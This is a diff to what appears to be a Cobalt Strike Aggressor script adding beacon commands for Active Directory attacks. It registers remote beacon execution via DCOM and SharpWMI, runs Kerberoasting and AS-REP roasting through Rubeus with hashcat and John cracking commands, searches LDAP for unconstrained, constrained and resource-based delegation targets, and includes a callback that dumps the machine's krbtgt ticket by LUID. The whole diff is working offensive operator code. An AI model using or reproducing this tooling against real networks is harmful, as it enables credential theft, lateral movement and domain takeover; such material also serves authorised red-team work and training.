@@ -10,7 +10,18 @@ $RUBEUS_PATH        = getFileProper("C:\\Tools\\Rubeus\\Rubeus\\bin\\Release","R
 $SEATBELT_PATH      = getFileProper("C:\\Tools\\Seatbelt\\Seatbelt\\bin\\Release","Seatbelt.exe");
 $ADSEARCH_PATH      = getFileProper("C:\\Tools\\ADSearch\\ADSearch\\bin\\Release","ADSearch.exe");
 
-#generate random printable text of length $length
+#TEST FUNCTION
+command beacons {
+   local('$entry $key $value');
+   foreach $entry (beacons()) {
+      println("== " . $entry['id'] . " ==");
+      foreach $key => $value ($entry) {
+         println("$[20]key : $value");
+      }
+      println();
+   }
+}
+#generate random printable text of $length
 sub rand_alphanum {
     local('$length $out $charstr $i $index');
     $length = $1;
@@ -24,6 +35,7 @@ sub rand_alphanum {
     return $out;
 }
 
+#ADD INVOKE_DCOM TO JUMP COMMAND
 sub invoke_dcom
 {
     local('$handle $script $oneliner $filename $payload')
@@ -54,9 +66,9 @@ sub invoke_dcom
     #link if p2p beacon
     beacon_link($1, $2, $3);
 }
-
 beacon_remote_exploit_register("invoke-dcom", "x64", "Uses invoke_dcom.ps1 to run remote beacon", &invoke_dcom)
 
+#ADD SHARPWMI TO JUMP COMMAND
 sub sharpwmi
 {
     local('$binpath $uploadpath $filename $args $payload')
@@ -85,7 +97,6 @@ sub sharpwmi
     #link if p2p beacon
     beacon_link($1, $2, $3);
 }
-
 beacon_remote_exploit_register("sharpwmi", "x64", "Uses SharpWMI to run remote beacon", &sharpwmi)
 
 alias import_powerview {
@@ -115,7 +126,7 @@ beacon_command_register(
     "Opens the port specified",
     "Opens the port specified");
 
-#EXECUTE ASSEMBLY ALIASE
+#EXECUTE ASSEMBLY ALIAS
 alias rubeus {
     bexecute_assembly($1, $RUBEUS_PATH, $2)
 }
@@ -140,10 +151,61 @@ beacon_command_register(
     "Execute Assmembly of ADSearch",
     "Execute Assmembly of ADSearch\n\nArgs must be wrapped in double quotes");
 
+#KERBEROASTING
+#FIND TARGETS
+alias kerberoast_findtargets {
+    bpowerpick($1, 'Get-NetUser -SPN | select serviceprincipalname,userprincipalname');
+}
+beacon_command_register(
+    "kerberoast_findtargets",
+    "User PowerView to find SPNs");
+
+#GRABBING KRB5TGS HASH
+sub kerberoast_tgsreq_cb{
+    blog($1, $2);
+    blog($1, "Cracking with Hashcat:'hashcat -a 0 -m 13100 hashes.txt wordlist.txt'");
+    blog($1, "Cracking with John:'john --format=krb5tgs --wordlist=wordlist <user>'");
+}
+alias kerberoast_tgsreq{
+    bexecute_assembly($1, $RUBEUS_PATH, 'kerberoast /nowrap /user:' . $2, $null, &kerberoast_tgsreq_cb);
+}
+beacon_command_register(
+    "kerberoast_tgsreq",
+    "Request the TGS with Rubeus");
+
+#AS-REP ROASTING
+#FIND TARGETS
+alias asreproast_findtargets {
+   bexecute_assembly($1, $ADSEARCH_PATH, '--search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname');
+}
+beacon_command_register(
+    "asreproast_findtargets",
+    "Find AS-REP roastable targets"
+);
+
+#REQUEST HASH
+sub asreproast_requesthash_cb {
+    blog($1, $2);
+    blog($1, "Cracking with Hashcat:'hashcat -a 0 -m 18200 hashes.txt wordlist.txt'");
+    blog($1, "Cracking with John:'john --format=krb5asrep --wordlist=wordlist <user>'");
+}
+alias asreproast_requesthash {
+    bexecute_assembly($1, $RUBEUS_PATH, 'asreproast /nowrap /user:' . $2, $null, &asreproast_requesthash_cb);
+}
+beacon_command_register(
+    "asreproast_findtargets",
+    "Get the specified user KRB5ASREP hash"
+);
+
+#UNCONSTRAINED DELEGATION
+#FINDING TARGETS
+alias unconstdel_findtargets {
+    bexecute_assembly($1, $ADSEARCH_PATH, '--search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname')
+}
+
 #CONSTRAINED DELEGATION
 #FINDING TARGETS
-alias constdel01_findtargets {
-#execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
+alias constdel_findtargets {
     bexecute_assembly($1, $ADSEARCH_PATH, "--search \"(&(objectCategory=computer)(msds-allowedtodelegateto=\*))\" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json")
 }
 beacon_command_register(
@@ -151,40 +213,36 @@ beacon_command_register(
     "Find Constrained Delegation Targets");
 
 #TRIAGE THEN DUMP TGT
-#regex: /^ \| (0[xX][0-9a-fA-F]+) {1,10}\| .*HOST_NAME\$.*krbtgt/gm
-sub constdel02_stealtgt_cb {
+sub constdel_stealtgt_cb {
     #Arguments: $1 = beacon ID, $2 = results, $3 = information map
-    local('$hostname $regx $luid');
+    local('$hostname $regx_luid $luid');
 
-    println($2);
     $hostname = lc(binfo($1, "computer"));
-    println("hostname: " . $hostname);
+    #println("hostname: " . $hostname);
 
-    #$regx = '(0x\w+)'; #returns all luids
-    #$regx = '(0x\w+).*' . $hostname . ''; #THIS SHIT WORKS!
-    $regx = '(0x\w+).*' . $hostname;
+    $regx_luid = '(0x\w+).*' . $hostname . '\$';
     
-    println("regx: " . $regx);
-    $luid = matches($2, $regx)[0];
-    println("luid: " . $luid);
-}
+    $luid = matches($2, $regx_luid)[0];
 
+    blog($1, $2);
+    blog($1, "Targetting LUID:" . $luid);
+
+    #dump ticket for krbtgt with $luid
+    bexecute_assembly($1, $RUBEUS_PATH, "dump /nowrap /service:krbtgt /luid:" . $luid);
+}
 alias constdel02_stealtgt {
     #execute assembly and pass results to helper sub, run LUID
-    bexecute_assembly($1, $RUBEUS_PATH, "triage /service:krbtgt", $null, &constdel02_stealtgt_cb)
+    bexecute_assembly($1, $RUBEUS_PATH, "triage /service:krbtgt", $null, &constdel02_stealtgt_cb);
 }
 beacon_command_register(
     "constdel02_stealtgt",
     "Steal the local machine TGT");
 
-#TEST FUNCTION
-command beacons {
-   local('$entry $key $value');
-   foreach $entry (beacons()) {
-      println("== " . $entry['id'] . " ==");
-      foreach $key => $value ($entry) {
-         println("$[20]key : $value");
-      }
-      println();
-   }
+#ROLE BASED CONSTRAINED DELEGATION
+#FINDING TARGETS
+alias rbcd_findtargets {
+    bpowerpick($1, 'Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }');
 }
+beacon_command_register(
+    "rbcd_findtargets",
+    "Find Role Based Constrained Delegation Machines");
